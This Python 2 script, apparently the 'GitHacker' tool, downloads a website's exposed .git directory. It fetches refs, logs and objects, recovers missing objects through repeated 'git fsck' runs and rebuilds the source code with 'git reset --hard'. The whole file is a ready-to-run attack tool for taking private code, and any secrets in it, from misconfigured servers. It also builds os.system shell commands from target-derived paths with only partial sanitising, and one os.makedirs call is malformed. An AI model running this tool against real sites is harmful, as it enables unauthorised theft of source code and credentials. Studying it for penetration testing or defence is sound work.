#!/usr/bin/env python
# encoding:utf-8

import os
import requests
import sys
import re


def dirlist(path, allfile):
    filelist = os.listdir(path)
    for filename in filelist:
        filepath = os.path.join(path, filename)
        if os.path.isdir(filepath):
            dirlist(filepath, allfile)
        else:
            allfile.append(filepath)
    return allfile


def downloadFile(url, path):
    index = path[::-1].find("/")
    folder = path[0:-index]
    try:
        print "[+] Make dir : %s" % (folder)
        os.makedirs(folder)
    except:
        print "[-] Folder already existed!"
    print "[!] Getting -> %s" % (url)
    response = requests.get(url)
    if response.status_code == 200:
        with open(path, "wb") as f:
            print response.content
            f.write(response.content)
            print "[+] Success!"
    else:
        print "[-] [%d]" % (response.status_code)


def get_sha1(content):
    result = re.findall(r"([a-fA-F0-9]{40})", content)
    return result


def fixmissing(baseurl, temppath):
    # get missing files
    os.system("cd ./%s ; git fsck --name-objects > ../cache.dat 2>&1" % temppath)
    missing = []
    with open("./cache.dat", "r") as f:
        missing += get_sha1(f.read())

    length = len(missing)
    # clean cache file
    os.system("rm ./cache.dat")

    # download missing files
    for i in missing:
        path = "./%s/.git/objects/%s/%s" % (temppath, i[0:2], i[2:])
        url = "%sobjects/%s/%s" % (baseurl, i[0:2], i[2:])
        downloadFile(url, path)
    if length > 1:
        fixmissing(baseurl, temppath)
    else:
        return


def complete_url(baseurl):
    if (not baseurl.startswith("http://")) and (not baseurl.startswith("https://")):
        baseurl = "http://" + baseurl
    if baseurl.endswith("/.git/"):
        return baseurl
    elif baseurl.endswith("/.git"):
        return baseurl + "/"
    elif baseurl.endswith("/"):
        return baseurl + ".git/"
    else:
        return baseurl + "/.git/"


def get_prefix(baseurl):
    prefix = ""
    if baseurl.startswith("http://"):
        prefix = baseurl[len("http://"):-len(".git/")]
    if baseurl.startswith("https://"):
        prefix = baseurl[(len("https://")):(-len(".git/"))]
    return prefix


def repalce_bad_chars(path):
    path = path.replace("/", "_")
    path = path.replace("\\", "_")
    path = path.replace(".", "_")
    path = path.replace("'", "_")
    path = path.replace("\"", "_")
    return path


def main():
    if len(sys.argv) != 2:
        print "Usage : "
        print "        python GitHacker.py [Website]"
        print "Example : "
        print "        python Githack.py http://127.0.0.1/"
        print "Author : "
        print "        wangyihang <wangyihanger@gmail.com>"
        exit(1)

    files = dirlist("./", [])
    baseurl = sys.argv[1]
    baseurl = complete_url(baseurl)
    temppath = repalce_bad_chars(get_prefix(baseurl))

    # download base files
    for i in files:
        if i.startswith("./.git"):
            if i[len("./.git/"):len("./.git/objects")] == "objects":
                continue
            path = "./%s/%s" % (temppath, i[2:])
            url = baseurl[0:-len(".git/")] + i[2:]
            downloadFile(url, path)

    # download baseobject files
    master = open("./%s/.git/logs/refs/heads/master" % temppath, "r")
    print "[!] Downloading object files"
    for line in master:
        prehash = line.split(" ")[0]
        nexthash = line.split(" ")[1]
        path = "./%s/.git/objects/%s/%s" % (temppath,
                                            nexthash[0:2], nexthash[2:])
        url = "%sobjects/%s/%s" % (
            baseurl, nexthash[0:2], nexthash[2:])

        try:
            os.makedirs("./%s/%s", (temppath, path))
        except Exception as e:
            print "[-] %s" % (e)

        print (url, path)
        downloadFile(url, path)

    print "[+] Start fixing missing files..."
    # download missing files
    fixmissing(baseurl, temppath)

    # git reset to the last commit
    os.system("cd ./%s; git reset --hard;" % temppath)

if __name__ == "__main__":
    main()
